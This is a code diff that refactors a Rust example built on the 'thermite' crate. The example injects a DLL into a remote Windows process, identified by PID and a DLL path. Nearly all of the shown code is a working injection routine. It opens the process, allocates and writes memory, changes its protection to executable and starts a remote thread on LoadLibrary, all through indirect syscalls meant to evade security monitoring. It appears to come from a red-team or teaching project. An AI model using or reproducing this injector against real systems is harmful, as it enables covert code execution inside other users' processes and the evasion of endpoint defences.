@@ -7,59 +7,13 @@ use std::ops::Not;
 use std::path::{Path, PathBuf};
 use std::ptr::null;
 
-use thermite::{debug, error, info};
+use thermite::{debug, error, info, syscall_status};
 use thermite::indirect_syscall as syscall;
 
 use thermite::models::windows::nt_status::NtStatus;
+use thermite::models::windows::peb_teb::UNICODE_STRING;
 use thermite::peb_walk::{get_function_address, get_module_address};
-
-
-#[repr(C)]
-#[derive(Clone, Debug, Copy)]
-pub struct ObjectAttributes {
-	length: u32,
-	root_directory: isize,
-	object_name: *const c_void,
-	attributes: u32,
-	security_descriptor: *const c_void,
-	security_quality_of_service: *const c_void,
-}
-
-
-#[repr(C)]
-#[derive(Debug)]
-pub struct ClientId {
-	pub unique_process: isize,
-	pub unique_thread: isize,
-}
-
-
-// Some useful constants
-// lifted straight from windows libs const MEM_RESERVE: u32 = 0x2000;
-const MEM_RESERVE: u32 = 0x2000;
-const MEM_COMMIT: u32 = 0x1000;
-const PAGE_READWRITE: u32 = 0x04;
-const PAGE_EXECUTE_READ: u32 = 0x20;
-const GENERIC_EXECUTE: u32 = 0x20000000;
-const SYNCHRONIZE: u32 = 0x00100000u32;
-const STANDARD_RIGHTS_REQUIRED: u32 = 0x00100000u32;
-const PROCESS_ALL_ACCESS: u32 = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF;
-
-
-// Utility function that handles the return value of syscalls and quits if it's not a success
-fn print_status(str: &str, x: i32) -> NtStatus {
-	let nt_status: NtStatus = unsafe { mem::transmute(x) };
-	match nt_status {
-		NtStatus::StatusSuccess => {
-			info!("{}: {}", str, nt_status);
-		}
-		_ => {
-			error!(nt_status);
-			process::exit(nt_status as _);
-		}
-	}
-	return nt_status;
-}
+use thermite::models::windows::*;
 
 
 /// Read the PID and the DLL Path from the program's command line arguments,
@@ -99,26 +53,18 @@ fn main() {
 }
 
 
-///
-/// The function below demonstrate how to inject a DLL in a remote process using direct syscalls
+/// This function demonstrate how to inject a DLL in a remote process using direct syscalls
 /// Arguments: PID of the target process and the absolute path to the DLL to inject
 fn injector(pid: u32, dll_path: &str) {
-	// Declaring structures we're going to need
+	let oa_process = ObjectAttributes::default();
 	let mut thread_handle: isize = 0;
-	let oa_process: ObjectAttributes = ObjectAttributes {
-		length: mem::size_of::<ObjectAttributes>() as _,
-		root_directory: 0u32 as _,
-		object_name: 0u32 as _,
-		attributes: 0,
-		security_descriptor: 0u32 as _,
-		security_quality_of_service: 0u32 as _,
-	};
 	let mut process_handle: isize = -1;
 
 	let client_id = ClientId {
 		unique_process: pid as _,
 		unique_thread: 0 as _,
 	};
+
 
 	let nt_status = syscall!(
 	    "NtOpenProcess",
@@ -127,7 +73,7 @@ fn injector(pid: u32, dll_path: &str) {
 	    &oa_process,         //  [in]           POBJECT_ATTRIBUTES ObjectAttributes,
 	    &client_id,          //  [in, optional] PCLIENT_ID         ClientId
 	);
-	print_status("NtOpenProcess", nt_status);
+	syscall_status!("NtOpenProcess", nt_status);
 
 	let mut buf_size: usize = dll_path.len();
 	let mut base_addr: *mut c_void = 0u32 as _;
@@ -141,7 +87,7 @@ fn injector(pid: u32, dll_path: &str) {
 	    MEM_COMMIT | MEM_RESERVE, // [in]      ULONG    AllocationType,
 	    PAGE_READWRITE,           // [in]      ULONG    Protect
 	);
-	print_status("NtAllocateVirtualMemory", nt_status);
+	syscall_status!("NtAllocateVirtualMemory", nt_status);
 	info!("Allocated {} bytes of memory at address {:#x?}", buf_size, base_addr);
 
 	// Copy the DLL Path to newly allocated memory
@@ -154,7 +100,7 @@ fn injector(pid: u32, dll_path: &str) {
 	    buf_size,           // [in]              ULONG     NumberOfBytesToWrite,
 	    &mut bytes_written  // [out, optional]   PULONG    NumberOfBytesWritten ,
 	);
-	print_status("NtWriteVirtualMemory", nt_status);
+	syscall_status!("NtWriteVirtualMemory", nt_status);
 
 	info!("Successfully written {} bytes in remote memory", buf_size);
 
@@ -169,7 +115,7 @@ fn injector(pid: u32, dll_path: &str) {
 	    PAGE_EXECUTE_READ,  // [in]              ULONG     NewAccessProtection,
 	    &mut old_protection,// [out]             PULONG    OldAccessProtection,
 	);
-	print_status("NtProtectVirtualMemory", nt_status);
+	syscall_status!("NtProtectVirtualMemory", nt_status);
 
 	let load_library_ptr = unsafe {
 		let kernel32_ptr = get_module_address("kernel32.dll").unwrap();
@@ -191,7 +137,7 @@ fn injector(pid: u32, dll_path: &str) {
 	    null::<*mut c_void>(), // [in, optional]   SIZE_T MaximumStackSize,
 	    null::<*mut c_void>(), // [in, optional]   PVOID AttributeList
 	);
-	print_status("NtCreateThreadEx", nt_status);
+	syscall_status!("NtCreateThreadEx", nt_status);
 
 	// Wait for the thread to execute
 	// Timeout is a null pointer, so we wait indefinitely
@@ -201,12 +147,12 @@ fn injector(pid: u32, dll_path: &str) {
 	    0,                      //  [in] BOOLEAN        Alertable,
 	    null::<*mut c_void>()   //  [in] PLARGE_INTEGER Timeout
 	);
-	print_status("NtWaitForSingleObject", nt_status);
+	syscall_status!("NtWaitForSingleObject", nt_status);
 
 	// Close the handle
 	let nt_status = syscall!(
 	    "NtClose",
 	    thread_handle // [in] HANDLE Handle
 	);
-	print_status("NtClose", nt_status);
+	syscall_status!("NtClose", nt_status);
 }
